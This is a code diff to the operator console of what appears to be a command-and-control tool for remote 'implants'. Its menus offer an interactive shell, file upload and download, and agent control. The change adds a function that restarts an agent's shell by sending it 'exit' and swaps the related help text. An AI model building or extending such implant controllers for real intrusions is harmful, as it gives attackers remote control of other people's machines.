@@ -38,6 +38,20 @@ extern volatile sig_atomic_t shell_flag;
 #define MENU "Provide an option.\n1 - list active agents\n2 - select active agent\n9 - exit\n"
 #define AGENT_MENU "Implant %d selected.\nProvide an option.\n1 - interactive shell\n2 - put file\n3 - get file\n4 - restart shell\n5 - stop agent\n6 - go back\n"
 
+STATIC int restart_shell(int agent_fd){
+	int buffer_size;
+	const char exit_str[] = "exit";
+	char* buffer;
+
+	buffer_size = strlen(exit_str);
+	buffer = malloc(buffer_size + 1);
+	memcpy(buffer, exit_str, buffer_size);
+
+	listener_prepare_message(agent_fd, TYPE_COMMAND, buffer, buffer_size + 1);
+
+	return RET_OK;
+}
+
 STATIC int shell_console(int agent_fd){
 	int retval;
 	char command_buf[PAYLOAD_SIZE];
@@ -45,7 +59,7 @@ STATIC int shell_console(int agent_fd){
     fd_set console_fds;
     struct timeval tv;
 
-	printf("Ctrl-c to restart shell\nexit to leave shell running");
+	printf("Ctrl-c to leave shell running\nexit to restart shell");
 	print_out("%s", "");
 
 	shell_flag = true;
@@ -227,7 +241,9 @@ STATIC int agent_console(Agent* agent, int agent_fd){
 					break;
 				case 4:
 					// restart shell
-					listener_prepare_message(agent_fd, TYPE_RESTART_SHELL, NULL, 0);
+					if (restart_shell(agent_fd) != RET_OK){
+						return RET_ERROR;
+					}
 					break;
 				case 5:
 					// close agent
